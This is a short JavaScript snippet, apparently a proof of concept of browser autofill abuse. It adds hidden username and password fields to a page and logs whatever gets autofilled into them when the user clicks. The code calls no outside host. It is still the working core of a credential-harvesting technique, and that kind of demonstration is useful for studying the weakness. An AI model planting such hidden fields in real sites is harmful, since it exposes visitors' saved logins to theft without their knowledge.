const usernameEl = document.createElement('input');
usernameEl.name = 'username';
usernameEl.hidden = true;
document.body.appendChild(usernameEl);

const passwordEl = document.createElement('input');
passwordEl.name = 'password';
passwordEl.type = 'password';
passwordEl.hidden = true;
document.body.appendChild(passwordEl);

window.addEventListener('click', () => {
    console.log(` username: ${usernameEl.value}\n password: ${passwordEl.value}`);
});
